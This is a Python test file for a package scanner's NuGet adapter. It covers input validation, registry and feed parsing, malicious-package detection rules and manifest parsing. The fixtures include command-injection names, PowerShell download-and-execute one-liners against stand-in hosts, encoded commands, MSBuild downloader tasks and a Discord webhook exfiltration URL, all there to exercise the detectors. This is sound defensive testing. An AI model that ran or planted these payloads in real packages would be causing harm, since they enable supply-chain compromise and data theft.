# ruff: noqa: E501
"""NuGet 어댑터 — 오프라인 테스트 (httpx.MockTransport + MemoryTree)."""

from __future__ import annotations

import asyncio
import json

import httpx
import pytest

import ecosystems
from api.schemas import Severity
from common.pypi import PackageNotFound, PyPIError
from engine.rules.base import MemoryTree

ADAPTER = ecosystems.get("nuget")


def _run(coro):
    return asyncio.run(coro)


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


def _leaf(ver, published="2024-01-02T03:04:05+00:00", listed=True, deps=()):
    return {"catalogEntry": {
        "id": "Demo.Pkg", "version": ver, "published": published, "listed": listed,
        "authors": "Alice, Bob", "projectUrl": "https://example.com",
        "packageContent": f"https://api.nuget.org/v3-flatcontainer/demo.pkg/{ver}/demo.pkg.{ver}.nupkg",
        "dependencyGroups": [{"dependencies": [{"id": d} for d in deps]}],
    }}


# ── 검증 ──

def test_adapter_loads_and_metadata():
    assert ADAPTER.id == "nuget" and ADAPTER.osv_ecosystem == "NuGet" and ADAPTER.has_feed
    assert ADAPTER.purl("Newtonsoft.Json", "13.0.3") == "pkg:nuget/Newtonsoft.Json@13.0.3"


@pytest.mark.parametrize("name,ver", [
    ("Newtonsoft.Json", "13.0.3"), ("Microsoft.Extensions.Logging", "8.0.0-rc.1.23419.4"),
    ("a_b-c", "1.0.0.0"), ("X", "1.2.3-beta+build.5"),
])
def test_validate_accepts(name, ver):
    ADAPTER.validate(name, ver)


@pytest.mark.parametrize("name,ver", [
    ("a b", "1.0"), ("a;rm", "1.0"), ("../x", "1.0"), ("a/b", "1.0"), ("a", "1.0; ls"),
    ("a", "../1"), ("a", "1"), ("a", "1.0 "), ("", "1.0"), ("x" * 101, "1.0"),
])
def test_validate_rejects(name, ver):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, ver)


# ── 레지스트리 ──

def test_registry_parses_paged_index_and_unlisted():
    page2 = {"items": [_leaf("2.0.0", deps=("Dep.A",)), _leaf("2.1.0-beta", "2024-05-01T00:00:00Z")]}

    def handler(req: httpx.Request) -> httpx.Response:
        if req.url.path.endswith("/demo.pkg/index.json"):
            return httpx.Response(200, json={"items": [
                {"items": [_leaf("1.0.0", "2020-01-01T00:00:00+00:00"),
                           _leaf("1.1.0", "1900-01-01T00:00:00+00:00", listed=False)]},
                {"@id": "https://api.nuget.org/v3/registration5-gz-semver2/demo.pkg/page2.json"},
            ]})
        if req.url.path.endswith("page2.json"):
            return httpx.Response(200, json=page2)
        return httpx.Response(404)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("Demo.Pkg", client=c)

    proj = _run(go())
    assert set(proj.releases) == {"1.0.0", "1.1.0", "2.0.0", "2.1.0-beta"}
    assert proj.latest == "2.0.0"  # 프리릴리스·unlisted 제외
    unlisted = proj.releases["1.1.0"]
    assert unlisted.yanked and unlisted.uploaded_at is None
    assert proj.releases["2.0.0"].dependencies == ["Dep.A"]
    assert proj.maintainers == ["Alice", "Bob"]
    arts = ADAPTER.select_artifacts(proj, "2.0.0")
    assert len(arts) == 1 and arts[0].kind == "nupkg" and arts[0].url.endswith(".nupkg")
    assert proj.previous_version("2.0.0") == "1.0.0"


def test_registry_not_found_message():
    async def go():
        async with _client(lambda r: httpx.Response(404)) as c:
            return await ADAPTER.fetch_project("Nope", client=c)

    with pytest.raises(PackageNotFound, match="Nope is not on NuGet"):
        _run(go())


@pytest.mark.parametrize("resp", [httpx.Response(503), httpx.Response(200, content=b"<html>"),
                                  httpx.Response(200, json=[1])])
def test_registry_errors_are_not_not_found(resp):
    async def go():
        async with _client(lambda r: resp) as c:
            return await ADAPTER.fetch_project("x", client=c)

    with pytest.raises(PyPIError) as ei:
        _run(go())
    assert not isinstance(ei.value, PackageNotFound)


def test_registry_network_error():
    def boom(req):
        raise httpx.ConnectError("down")

    async def go():
        async with _client(boom) as c:
            return await ADAPTER.fetch_project("x", client=c)

    with pytest.raises(PyPIError):
        _run(go())


def test_registry_rejects_foreign_page_url():
    def handler(req):
        return httpx.Response(200, json={"items": [{"@id": "http://evil.test/p.json"}]})

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("x", client=c)

    with pytest.raises(PyPIError):
        _run(go())


# ── 피드 ──

def test_feed_newest_first_and_skips_deletes():
    index = {"items": [
        {"@id": "https://api.nuget.org/v3/catalog0/page1.json", "commitTimeStamp": "2026-01-01T00:00:00Z"},
        {"@id": "https://api.nuget.org/v3/catalog0/page2.json", "commitTimeStamp": "2026-02-01T00:00:00Z"},
    ]}
    p1 = {"items": [{"@type": "nuget:PackageDetails", "nuget:id": "Old", "nuget:version": "1.0.0"}]}
    p2 = {"items": [
        {"@type": "nuget:PackageDetails", "nuget:id": "A", "nuget:version": "1.0.0"},
        {"@type": "nuget:PackageDelete", "nuget:id": "Gone", "nuget:version": "1.0.0"},
        {"@type": "nuget:PackageDetails", "nuget:id": "B", "nuget:version": "2.0.0"},
    ]}

    def handler(req):
        path = req.url.path
        body = {"/v3/catalog0/index.json": index, "/v3/catalog0/page1.json": p1,
                "/v3/catalog0/page2.json": p2}.get(path)
        return httpx.Response(200, json=body) if body else httpx.Response(404)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = _run(go())
    assert items == [("B", "2.0.0"), ("A", "1.0.0"), ("Old", "1.0.0")] and errors == []


def test_feed_failure_is_reported_not_hidden():
    async def go():
        async with _client(lambda r: httpx.Response(500)) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = _run(go())
    assert items == [] and errors


# ── 규칙 ──

def _scan(files):
    return ADAPTER.analyze_tree(MemoryTree(files))


def _sev(findings, rule=None):
    return {f.severity for f in findings if rule is None or f.rule == rule}


def test_install_ps1_download_and_exec_is_high():
    f = _scan({"tools/install.ps1":
               "$u='http://x.test/a.ps1'\nInvoke-WebRequest $u -OutFile a.ps1\nInvoke-Expression (gc a.ps1)\n"})
    assert Severity.HIGH in _sev(f, "nuget-powershell-exec")


def test_install_ps1_encoded_command_high_and_base64_load():
    enc = "powershell -EncodedCommand " + "QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBB"
    assert Severity.HIGH in _sev(_scan({"tools/init.ps1": enc}), "nuget-encoded-command")
    b64 = "$b=[Convert]::FromBase64String($x)\n[System.Reflection.Assembly]::Load($b)\n"
    assert Severity.HIGH in _sev(_scan({"tools/install.ps1": b64}), "nuget-encoded-command")


def test_hidden_window_start_process_high():
    f = _scan({"tools/install.ps1": "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList 'x'"})
    assert Severity.HIGH in _sev(f, "nuget-powershell-exec")


def test_webhook_token_high_anywhere():
    hook = "https://discord.com/api/webhooks/123456789012345678/" + "a" * 40
    f = _scan({"lib/net8.0/Evil.dll": "MZ\x90 " + hook})
    assert Severity.HIGH in _sev(f, "nuget-dll-strings")
    f = _scan({"build/x.targets": f'<Project><Target Name="t"><Message Text="{hook}"/></Target></Project>'})
    assert Severity.HIGH in _sev(f, "nuget-exfil-endpoint")


def test_ordinary_install_ps1_is_low():
    f = _scan({"tools/install.ps1":
               "param($installPath, $toolsPath, $package, $project)\n$project.Object.References.Add('x')\n"})
    assert _sev(f) == {Severity.LOW}


def test_non_auto_ps1_is_only_medium():
    f = _scan({"scripts/helper.ps1": "iwr http://x.test/a | iex"})
    assert Severity.HIGH not in _sev(f) and Severity.MEDIUM in _sev(f)


def test_targets_exec_suspicious_high_plain_low():
    bad = ('<Project><Target Name="B" BeforeTargets="Build">'
           '<Exec Command="powershell -w hidden iwr http://x.test/a.exe -OutFile a.exe" />'
           "</Target></Project>")
    assert Severity.HIGH in _sev(_scan({"build/Pkg.targets": bad}), "nuget-msbuild-exec")
    ok = ('<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="G">'
          '<Exec Command="dotnet tool run codegen" /></Target></Project>')
    f = _scan({"buildTransitive/Pkg.targets": ok})
    assert _sev(f) == {Severity.LOW}


def test_ordinary_targets_produce_nothing():
    props = ('<Project><PropertyGroup><Foo>1</Foo></PropertyGroup><ItemGroup>'
             '<None Include="$(MSBuildThisFileDirectory)native\\x.dll"><CopyToOutputDirectory>Always'
             "</CopyToOutputDirectory></None></ItemGroup></Project>")
    assert _scan({"build/Pkg.targets": props, "build/Pkg.props": props}) == []


def test_inline_task_high_vs_medium():
    def task(body):
        return ('<Project><UsingTask TaskName="T" TaskFactory="RoslynCodeTaskFactory" '
                'AssemblyFile="x.dll"><Task><Code Type="Fragment" Language="cs"><![CDATA['
                + body + "]]></Code></Task></UsingTask></Project>")
    hi = _scan({"build/a.targets": task("new WebClient().DownloadFile(u,p); Process.Start(p);")})
    assert Severity.HIGH in _sev(hi, "nuget-inline-task")
    lo = _scan({"build/a.targets": task("Log.LogMessage(Name);")})
    assert _sev(lo, "nuget-inline-task") == {Severity.MEDIUM}


def test_downloadfile_is_medium_not_high():
    t = ('<Project><Target Name="D"><DownloadFile SourceUrl="https://x.test/a" '
         'DestinationFolder="o"/></Target></Project>')
    assert _sev(_scan({"build/a.targets": t})) == {Severity.MEDIUM}


def test_xml_with_doctype_is_not_parsed_and_is_reported():
    evil = '<!DOCTYPE x [<!ENTITY a "aaaa">]><Project>&a;</Project>'
    f = _scan({"build/a.targets": evil})
    assert f and f[0].severity == Severity.MEDIUM and "해석하지 못함" in (f[0].detail or "")


def test_nuspec_dotnet_tool_low():
    nuspec = ('<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd"><metadata>'
              '<packageTypes><packageType name="DotnetTool"/></packageTypes></metadata></package>')
    f = _scan({"demo.nuspec": nuspec})
    assert [x.rule for x in f] == ["nuget-package-type"] and f[0].severity == Severity.LOW


def test_findings_sorted_and_cwes_registered():
    f = _scan({
        "tools/install.ps1": "iwr http://x.test/a | iex",
        "build/a.targets": '<Project><Target Name="t"><Exec Command="echo hi"/></Target></Project>',
    })
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    assert [order[x.severity.value] for x in f] == sorted(order[x.severity.value] for x in f)
    cwes = ADAPTER.rule_cwes()
    assert all(x.rule in cwes and x.cwe in cwes[x.rule] for x in f)
    assert all(r.startswith("nuget-") for r in cwes)


def test_has_install_script():
    assert ADAPTER.has_install_script(None, "1", ["tools/init.ps1"])  # type: ignore[arg-type]
    assert ADAPTER.has_install_script(None, "1", ["build/x.targets"])  # type: ignore[arg-type]
    assert not ADAPTER.has_install_script(None, "1", ["lib/net8.0/x.dll"])  # type: ignore[arg-type]


# ── 매니페스트 ──

def test_lockfile():
    text = json.dumps({"version": 1, "dependencies": {"net8.0": {
        "Newtonsoft.Json": {"type": "Direct", "requested": "[13.0.3, )", "resolved": "13.0.3"},
        "Dep": {"type": "Transitive", "resolved": "1.0.0"},
        "Local": {"type": "Project"},
    }}})
    deps = {d.name: d for d in ADAPTER.parse_manifest("packages.lock.json", text)}
    assert set(deps) == {"Newtonsoft.Json", "Dep"}
    assert deps["Newtonsoft.Json"].direct and deps["Dep"].direct is False
    assert deps["Dep"].version == "1.0.0"
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("packages.lock.json", "{")


def test_packages_config():
    xml = ('<packages><package id="A" version="1.2.3" targetFramework="net48"/>'
           '<package id="B" version="[1,2)"/></packages>')
    deps = ADAPTER.parse_manifest("packages.config", xml)
    assert [(d.name, d.version) for d in deps] == [("A", "1.2.3"), ("B", None)]


def test_csproj_and_central_props():
    csproj = """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup>
      <PackageReference Include="A" Version="1.0.0" />
      <PackageReference Include="B"><Version>2.0.1-beta</Version></PackageReference>
      <PackageReference Include="C" Version="$(CVer)" />
      <PackageReference Include="D" Version="1.*" />
      <PackageReference Include="E" />
      <PackageReference Include="F" Version="[3.4.5]" />
      <PackageReference Update="Z" Version="9.9.9" />
    </ItemGroup></Project>"""
    deps = {d.name: d for d in ADAPTER.parse_manifest("src/App/App.csproj", csproj)}
    assert deps["A"].version == "1.0.0" and deps["B"].version == "2.0.1-beta"
    assert deps["C"].version is None and deps["C"].spec == "$(CVer)"
    assert deps["D"].version is None and deps["E"].version is None
    assert deps["F"].version == "3.4.5" and "Z" not in deps
    props = '<Project><ItemGroup><PackageVersion Include="A" Version="4.0.0"/></ItemGroup></Project>'
    assert ADAPTER.parse_manifest("Directory.Packages.props", props)[0].version == "4.0.0"
    assert ADAPTER.handles_filename("X.fsproj") and ADAPTER.handles_filename("a/Directory.Packages.props")
    assert not ADAPTER.handles_filename("README.md")


def test_manifest_xml_bomb_rejected():
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("a.csproj", '<!DOCTYPE x [<!ENTITY a "b">]><Project/>')
